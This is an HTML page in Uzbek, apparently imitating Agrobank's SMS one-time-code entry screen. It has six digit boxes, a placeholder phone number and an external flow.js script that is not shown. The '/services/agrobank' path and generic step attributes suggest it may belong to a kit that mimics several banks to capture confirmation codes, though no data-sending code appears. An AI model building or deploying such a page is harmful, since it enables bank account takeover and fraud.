<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Agrobank SMS</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./styles.css" />
  </head>
  <body data-screen="flow" data-step="age">
    <main class="page">
      <section class="step-card">
        <header class="topbar" aria-label="Agrobank top bar">
          <a class="back-link" href="/services/agrobank" aria-label="Ortga qaytish">&#8592;</a>
          <div class="brand">
            <img class="brand-logo" src="./img/logo.png" alt="Agrobank logo" />
            <span class="brand-name">Agrobank</span>
          </div>
          <div></div>
        </header>

        <br>

        <header class="hero-copy step-copy">
          <h1>Tasdiqlash kodini kiriting</h1>
          <p class="otp-lead">
            Telefon raqamingizga 6 xonali kod yubordik
            <strong id="otpPhoneValue">+998 12 345 67 89</strong>
          </p>
        </header>

        <form class="step-form" id="stepForm">
          <input id="stepValue" name="value" type="hidden" />

          <div class="otp-grid" id="otpGrid">
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
          </div>

          <p class="field-error" id="fieldError"></p>
          <button class="submit-btn is-inactive" type="submit" id="submitStepButton" disabled>Davom etish</button>
          <p class="status" id="statusMessage" aria-live="polite"></p>
        </form>
      </section>
    </main>

    <script src="./flow.js"></script>
  </body>
</html>
